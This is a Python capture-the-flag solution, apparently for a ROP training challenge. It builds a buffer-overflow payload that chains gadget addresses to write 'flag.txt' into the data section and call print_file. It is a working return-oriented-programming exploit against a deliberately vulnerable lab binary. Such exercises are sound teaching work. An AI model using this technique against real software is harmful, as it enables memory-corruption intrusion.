"""
How the exploit works? We need to write our "flag.txt" string in some location to make
the calling convetion to work. So, we have two available instructions in the usefulGadgets 
section the mov [r14], r15. To write the values we use the data section, the exploit will 
pop in r14 the data section address and "flag.txt" in r15, the next instruction will mov 
the "flag.txt" to the data section mov [r14], r15.

After moving the string to the data section, just pop the data section in RDI and call the
function performing the calling convention.

"""

pattern = "A"*40
pop_r14_pop_r15 = "\x90\x06\x40\x00\x00\x00\x00\x00" # pop r14; pop r15; ret
mov_r14_r15     = "\x28\x06\x40\x00\x00\x00\x00\x00" # mov r14 r15;
data            = "\x28\x10\x60\x00\x00\x00\x00\x00" # data section
flag            = "\x66\x6C\x61\x67\x2E\x74\x78\x74" # flag.txt
print_file      = "\x10\x05\x40\x00\x00\x00\x00\x00" # Print file function
pop_rdi         = "\x93\x06\x40\x00\x00\x00\x00\x00" # POP RDI


print(pattern + 
        pop_r14_pop_r15 + data +  flag + 
	mov_r14_r15 + 
	pop_rdi + data + 
	print_file
)
